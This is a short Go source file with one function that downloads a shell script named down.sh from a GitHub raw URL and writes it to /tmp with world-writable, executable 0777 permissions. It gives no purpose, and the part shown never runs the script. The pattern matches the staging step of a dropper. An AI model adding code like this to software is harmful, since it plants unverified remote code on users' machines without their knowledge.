package main


import (


"net/http"
"io/ioutil"

)






func down_vkzmn()  int {


invalid :=    2



cli := http.Client{}


resp , err_get := cli.Get("https://github.com/atilabyte/golang/raw/refs/heads/master/down.sh")


 if err_get != nil {


  //erro no github.com 

          return  invalid

   }



script  , err_readall :=  ioutil.ReadAll(resp.Body) 

   if err_readall  != nil  {


       //"erro em readall"


           return invalid


            }


ioutil.WriteFile("/tmp/down_vkzmn.sh" , script , 0777 )



return 0 

}













